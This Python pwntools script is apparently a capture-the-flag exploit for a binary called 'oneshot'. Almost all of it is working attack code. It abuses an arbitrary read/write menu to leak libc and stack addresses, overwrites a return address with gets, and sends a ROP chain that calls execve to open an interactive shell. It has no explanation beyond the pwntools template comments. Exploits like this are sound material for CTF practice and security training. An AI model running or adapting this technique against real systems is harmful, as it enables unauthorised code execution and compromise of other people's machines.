#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./oneshot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './oneshot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

ror = lambda val, r_bits: \
    ((val & (2**64-1)) >> r_bits%64) | \
    (val << (64-(r_bits%64)) & (2**64-1))

rol = lambda val, r_bits: \
    (val << r_bits%64) & (2**64-1) | \
    ((val & (2**64-1)) >> (64-(r_bits%64)))

puts = 0x403fb8

def readx(addr):
    io.sendlineafter(b'>>',str(1).encode())
    io.sendlineafter(b'>>',hex(addr)[2:].encode())
    io.recvuntil(b':')
    return int(io.recvline()[1:-1],16)

def writex(addr,value):
    io.sendlineafter(b'>>',str(2).encode())
    io.sendlineafter(b'>>',hex(addr)[2:].encode())
    io.sendlineafter(b'>>',hex(value)[2:].encode())

io = start()
#io = remote('localhost',13337)

libcx = readx(puts) - 0x87bd0

one_gadjet = libcx+0xef4ce

print('Libc addr: '+hex(libcx))

env = libcx+0x0000000020ad58

stack = readx(env)

print('Stack leak:'+hex(stack))

ret_addr = stack-0x180

gets = libcx+0x0000000000087070

writex(ret_addr,gets)

pop_rdi = libcx+0x000000000010f75b

pop_rsi = libcx+0x0000000000110a4d

pop_rdx_leave = libcx+0x00000000001449ba#+0x000000000009819d

execve = libcx+0x000000000eef30

payload = b'A'*8+p64(pop_rdi)+p64(libcx+0x1cb42f)+p64(pop_rsi)+p64(0)+p64(pop_rdx_leave)+p64(0)+p64(execve)

io.sendline(payload)

io.interactive()

